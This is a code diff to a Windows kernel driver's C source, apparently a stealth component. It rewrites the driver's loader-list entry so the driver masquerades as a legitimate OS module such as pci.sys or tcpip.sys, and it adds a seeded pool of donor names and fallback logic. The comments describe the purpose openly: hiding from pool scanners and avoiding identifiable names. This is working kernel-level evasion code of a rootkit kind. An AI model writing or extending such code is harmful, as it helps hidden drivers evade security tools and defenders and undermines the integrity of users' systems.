@@ -118,27 +118,39 @@ static BOOLEAN is_our_module(PKLDR_DATA_TABLE_ENTRY e, PDRIVER_OBJECT drv) {
     return (e->DllBase == drv->DriverStart);
 }
 
-/* Donor candidates in preference order. pci.sys is first because it is
- * loaded on every supported Zen 4 configuration (no PCI-less Windows
- * kernel shipped). The fallbacks cover cases where a locked-down system
- * image has stripped pci.sys for some reason (minimal WinPE, unusual
- * installations). All three donors are kernel-image modules with
- * stable UNICODE_STRING buffers; reading them after rename is safe for
- * as long as the donor itself stays loaded, and all three are
- * non-unloadable on normal builds. These donor names are legitimate OS
- * component names and never match the driver's own branded identity, so
- * they do not count as a brand leak in the release binary. */
+/* Donor pool for cover-module rename. The seed picks one preferred
+ * index via cfg.rename_donor_index; stealth_apply tries that donor
+ * first and falls back to the remaining pool in order if the preferred
+ * module is not loaded (minimal WinPE images strip some of them).
+ * Every entry is a legitimate OS component name — no branded identifier
+ * leaks through. The pool is intentionally diverse so a reseed shifts
+ * which legit driver name the KLDR entry wears. */
+static const WCHAR *const DONOR_POOL[] = {
+    L"pci.sys",
+    L"acpi.sys",
+    L"msrpc.sys",
+    L"storport.sys",
+    L"tcpip.sys",
+    L"ndis.sys",
+    L"disk.sys",
+    L"partmgr.sys"
+};
+#define DONOR_POOL_COUNT (sizeof(DONOR_POOL)/sizeof(DONOR_POOL[0]))
+
 static BOOLEAN is_donor_module(PKLDR_DATA_TABLE_ENTRY e) {
-    static const WCHAR *donors[] = {
-        L"pci.sys",
-        L"acpi.sys",
-        L"msrpc.sys",
-    };
     SIZE_T i;
-    for (i = 0; i < sizeof(donors)/sizeof(donors[0]); i++) {
-        if (name_matches(e, donors[i])) return TRUE;
+    for (i = 0; i < DONOR_POOL_COUNT; i++) {
+        if (name_matches(e, DONOR_POOL[i])) return TRUE;
     }
     return FALSE;
+}
+
+/* Preferred donor name for this seed; NULL falls back to is_donor_module
+ * matching any pool entry in load order. */
+static const WCHAR *preferred_donor_name(void) {
+    if (!g_chamber_cfg_v2_valid) return NULL;
+    SIZE_T idx = (SIZE_T)g_chamber_cfg_v2.rename_donor_index % DONOR_POOL_COUNT;
+    return DONOR_POOL[idx];
 }
 
 /* Pool-scanner evasion. Called AFTER stealth_apply's rename-in-place. The
@@ -237,14 +249,31 @@ NTSTATUS stealth_apply(PDRIVER_OBJECT drv) {
     }
 
     /* Second pass: find a donor module whose BaseDllName/FullDllName we
-     * can clone. Skip ourselves. */
-    for (cur = head->Flink; cur != head; cur = cur->Flink) {
-        PKLDR_DATA_TABLE_ENTRY e =
-            CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
-        if (e == our_entry) continue;
-        if (is_donor_module(e)) {
-            donor = e;
-            break;
+     * can clone. The seed selects one preferred name via
+     * cfg.rename_donor_index; try that donor first, then fall back to
+     * any pool member in load order if the preferred module is not
+     * resident. Skip ourselves. */
+    {
+        const WCHAR *preferred = preferred_donor_name();
+        if (preferred) {
+            for (cur = head->Flink; cur != head; cur = cur->Flink) {
+                PKLDR_DATA_TABLE_ENTRY e =
+                    CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY,
+                                      InLoadOrderLinks);
+                if (e == our_entry) continue;
+                if (name_matches(e, preferred)) { donor = e; break; }
+            }
+        }
+    }
+    if (!donor) {
+        for (cur = head->Flink; cur != head; cur = cur->Flink) {
+            PKLDR_DATA_TABLE_ENTRY e =
+                CONTAINING_RECORD(cur, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+            if (e == our_entry) continue;
+            if (is_donor_module(e)) {
+                donor = e;
+                break;
+            }
         }
     }
     if (!donor) {
